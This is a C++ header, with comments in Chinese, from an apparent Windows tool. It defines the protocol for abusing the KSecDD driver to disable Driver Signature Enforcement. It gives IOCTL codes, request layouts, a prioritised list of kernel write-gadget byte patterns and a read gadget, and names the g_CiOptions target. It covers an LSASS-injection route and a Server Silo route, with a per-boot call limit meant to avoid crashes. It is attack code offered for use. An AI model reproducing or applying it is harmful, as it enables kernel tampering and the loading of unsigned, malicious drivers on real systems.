#pragma once

// KsecDdProtocol.h
// 作用：KSecDD (ksecdd.sys) 驱动协议的唯一定义源。
// 两条路径（LSASS 注入 / Server Silo）共用同一套常量与结构。
//
// KSecDD 驱动约定（METHOD_NEITHER）：
//   IOCTL_KSEC_IPC_SET_FUNCTION_RETURN 的输入缓冲区为 SET_FUNCTION_RETURN_REQ。
//   驱动读取 FunctionReturn 指针，解引用得到 Function / Argument；
//   然后以 RAX=Function、RCX=Argument、EDX=Value 执行一次内核态调用。
//   写 gadget `mov [rcx], edx; ret` 可将 EDX 写入 RCX 指向的地址。

#include <cstdint>

namespace ks::misc::disable_dse::ksec_protocol
{
    // ================================================================
    // 一、IOCTL 控制码（与 ntddksec.h 一致）
    // ================================================================

    // kIoctlKsecConnectLsa：
    // - CTL_CODE(FILE_DEVICE_KSEC, 0, METHOD_BUFFERED, FILE_WRITE_ACCESS) = 0x398000。
    // - 输入为空，输出为 DWORD（LsapSystemProcessId，通常等于 4）。
    // - 只有第一个 Connect 的调用者被 KSecDD 记录为 LSA 进程。
    constexpr unsigned long kIoctlKsecConnectLsa = 0x00398000UL;

    // kIoctlKsecIpcSetFunctionReturn：
    // - CTL_CODE(FILE_DEVICE_KSEC, 27, METHOD_NEITHER, FILE_ANY_ACCESS) = 0x39006F。
    // - 输入缓冲区为 SET_FUNCTION_RETURN_REQ（见下文）。
    // - 输出为空。
    constexpr unsigned long kIoctlKsecIpcSetFunctionReturn = 0x0039006FUL;

    // ================================================================
    // 二、请求结构体（SET_FUNCTION_RETURN IOCTL 输入）
    // ================================================================

    // FunctionReturn：
    // - 由 SET_FUNCTION_RETURN_REQ.functionReturn 指针指向的结构。
    // - function 被加载到 RAX 并 CALL，argument 被加载到 RCX。
    struct FunctionReturn
    {
        void* function;   // function：要执行的内核地址（写/读 gadget）。
        void* argument;   // argument：第一参数（目标地址，如 g_CiOptions 所在地址）。
    };

    // SetFunctionReturnReq：
    // - SET_FUNCTION_RETURN IOCTL 的输入缓冲区。
    // - 驱动解引用 functionReturn 指针取 Function 和 Argument，
    //   然后以 Function(Argument, value) 形式执行。
    // - 注意：functionReturn 是用户态指针，METHOD_NEITHER 不做拷贝。
    struct SetFunctionReturnReq
    {
        FunctionReturn* functionReturn;  // functionReturn：指向 FunctionReturn 结构的指针。
        std::uint32_t   value;           // value：第二参数低 32 位（加载到 EDX）。
    };

    // ================================================================
    // 三、LSASS 注入路径原始 IOCTL 缓冲区布局
    // ================================================================
    //
    // LSASS 注入路径使用更底层的 16 字节缓冲区：
    //   [0-7]  = UINT64：指向栈上 {Rip, Arg1} 结构的指针
    //   [8-15] = UINT64：EDX 值（零扩展到 64 位）
    //
    // 这与 SetFunctionReturnReq 在内存布局上等价：
    //   偏移 0：指针（8 字节）
    //   偏移 8：值（低 4 字节有效，高 4 字节可为零或被忽略）
    //
    // 两条路径都使用 SetFunctionReturnReq 或等价的 16 字节布局。

    // ================================================================
    // 四、字节模式
    // ================================================================

    // kWriteGadgetPatterns：
    // - 按优先级排列的写 gadget 字节模式列表。
    // - 所有变体在 `mov [rcx], edx` 之后追加不影响写效果的尾指令。
    // - 扫描器按顺序逐个尝试，首个唯一命中即采用。
    struct WriteGadgetEntry
    {
        const std::uint8_t* pattern;   // pattern：字节模式。
        std::size_t         size;      // size：模式字节数。
        const char*         mnemonic;  // mnemonic：反汇编助记文本。
    };

    // 主模式：mov [rcx], edx; ret（3 字节，最短最常见）。
    constexpr std::uint8_t kWG0[] = { 0x89, 0x11, 0xC3 };
    // 后备 1：mov [rcx], edx; xor eax, eax; ret（5 字节，写后清返回值）。
    constexpr std::uint8_t kWG1[] = { 0x89, 0x11, 0x33, 0xC0, 0xC3 };
    // 后备 2：mov [rcx], edx; xor eax, eax; ret（5 字节，31 C0 编码）。
    constexpr std::uint8_t kWG2[] = { 0x89, 0x11, 0x31, 0xC0, 0xC3 };
    // 后备 3：mov [rcx], edx; nop; ret（4 字节）。
    constexpr std::uint8_t kWG3[] = { 0x89, 0x11, 0x90, 0xC3 };
    // 后备 4：mov [rcx], edx; mov eax, 1; ret（8 字节，写后返回 TRUE）。
    constexpr std::uint8_t kWG4[] = { 0x89, 0x11, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };

    // kWriteGadgetPatterns：按优先级排列的模式表。
    constexpr WriteGadgetEntry kWriteGadgetPatterns[] = {
        { kWG0, sizeof(kWG0), "mov [rcx], edx; ret" },
        { kWG1, sizeof(kWG1), "mov [rcx], edx; xor eax, eax; ret (33 C0)" },
        { kWG2, sizeof(kWG2), "mov [rcx], edx; xor eax, eax; ret (31 C0)" },
        { kWG3, sizeof(kWG3), "mov [rcx], edx; nop; ret" },
        { kWG4, sizeof(kWG4), "mov [rcx], edx; mov eax, 1; ret" },
    };
    constexpr std::size_t kWriteGadgetPatternCount =
        sizeof(kWriteGadgetPatterns) / sizeof(kWriteGadgetPatterns[0]);

    // 保留旧名以兼容已有代码中的 kWriteGadgetPatternSize 引用。
    constexpr std::uint8_t kWriteGadgetPattern[] = { 0x89, 0x11, 0xC3 };
    constexpr std::size_t  kWriteGadgetPatternSize = sizeof(kWriteGadgetPattern);

    // kReadGadgetPattern：
    // - `mov rax, [rcx+0x10]; mov [r8], rax; mov eax, 1; ret`
    //   = {0x48,0x8B,0x41,0x10, 0x49,0x89,0x00, 0xB8,0x01,0x00,0x00,0x00, 0xC3}。
    // - 效果：读取 (RCX+0x10) 处的 8 字节并写回 R8 指向的位置。
    // - 用途：在 SET_FUNCTION_RETURN 调用后，驱动会把 R8 写回的值
    //   覆盖到 SetFunctionReturnReq.functionReturn 字段中，调用方
    //   读回该字段即可取得内核内存读结果。
    constexpr std::uint8_t kReadGadgetPattern[] = {
        0x48, 0x8B, 0x41, 0x10,
        0x49, 0x89, 0x00,
        0xB8, 0x01, 0x00, 0x00, 0x00,
        0xC3
    };
    constexpr std::size_t  kReadGadgetPatternSize = sizeof(kReadGadgetPattern);

    // ================================================================
    // 五、设备路径与事件
    // ================================================================

    // kKsecDdDeviceName：KSecDD 设备的完整对象路径。
    constexpr wchar_t kKsecDdDeviceName[] = L"\\Device\\KsecDD";

    // kLsaInitializedEventName：LSA 认证初始化事件。
    // - 在打开 KSecDD 设备之前必须先信号此事件，否则 Connect 会失败。
    constexpr wchar_t kLsaInitializedEventName[] =
        L"\\SECURITY\\LSA_AUTHENTICATION_INITIALIZED";

    // ================================================================
    // 六、系统句柄表结构（SystemHandleInformation, class 0x10）
    // ================================================================
    //
    // 注意：ProcessId 是 ULONG（不是 USHORT），Handle 是 USHORT。
    // 该旧版信息类限制 Handle 值 < 0x10000；
    // SystemExtendedHandleInformation (class 0x40) 使用 ULONG_PTR，但 LSASS 句柄通常在 16 位范围内。

    // SystemHandleEntry：一条系统句柄信息。
    struct SystemHandleEntry
    {
        unsigned long processId;          // processId：拥有该句柄的进程 PID。
        unsigned char objectTypeNumber;   // objectTypeNumber：对象类型编号。
        unsigned char flags;              // flags：句柄属性位。
        unsigned short handleValue;       // handleValue：句柄值（16 位）。
        void* objectAddress;              // objectAddress：内核对象地址。
        unsigned long grantedAccess;      // grantedAccess：访问掩码。
    };

    // SystemHandleInformation：SystemHandleInformation 查询的返回头。
    struct SystemHandleInformation
    {
        unsigned long handleCount;        // handleCount：总句柄数。
        SystemHandleEntry handles[1];     // handles：变长尾数组。
    };

    // ================================================================
    // 七、Server Silo 创建常量
    // ================================================================

    // JOBOBJECTINFOCLASS 标准值（Win32 包装会校验 LimitFlags，必须走 NT 系统调用）。
    constexpr unsigned long kJobObjectExtendedLimitInformation = 9UL;

    // JOBOBJECTINFOCLASS 未公开值。
    constexpr unsigned long kJobObjectCreateSilo           = 35UL;
    constexpr unsigned long kJobObjectSiloRootDirectory    = 37UL;
    constexpr unsigned long kJobObjectServerSiloInitialize = 40UL;
    constexpr unsigned long kJobObjectSiloSystemRoot       = 45UL;

    // JOB_OBJECT_LIMIT_SILO_READY：SetLimitFlags 中表示 Job 准备好转换为 Silo。
    constexpr unsigned long kJobObjectLimitSiloReady = 0x00400000UL;

    // SILO_OBJECT_ROOT_DIRECTORY 标志的完整集合。
    constexpr unsigned long kSiloObjectRootDirectoryShadowRoot     = 0x00000001UL;
    constexpr unsigned long kSiloObjectRootDirectoryInitialize     = 0x00000002UL;
    constexpr unsigned long kSiloObjectRootDirectoryShadowDosDevs  = 0x00000004UL;
    constexpr unsigned long kSiloObjectRootDirectoryAll =
        kSiloObjectRootDirectoryShadowRoot
        | kSiloObjectRootDirectoryInitialize
        | kSiloObjectRootDirectoryShadowDosDevs;

    // FILE_IO_COMPLETION_NOTIFICATION 标志（NtSetInformationFile class 41）。
    constexpr unsigned long kFileIoCompletionNotificationInfoClass = 41UL;
    constexpr unsigned long kFileSkipSetEventOnHandle        = 0x00000002UL;
    constexpr unsigned long kFileSkipSetUserEventOnFastIo    = 0x00000004UL;

    // ================================================================
    // 八、安全限制
    // ================================================================

    // kMaxSiloCallsPerBoot：
    // - Server Silo 路径每次启动周期的最大安全 IOCTL 调用次数。
    // - KSecDD 处理 SET_FUNCTION_RETURN 时释放用户缓冲区作为内核池，
    //   第 5 次调用会触发 Bug Check。
    constexpr long kMaxSiloCallsPerBoot = 4;

    // kSiloCounterName：
    // - 跨进程调用计数器的命名共享内存名称。
    // - Global 前缀使其在所有会话可见；页面文件支持，重启后自动归零。
    constexpr wchar_t kSiloCounterName[] = L"Global\\KswordKsecDdSiloCallCount";
}
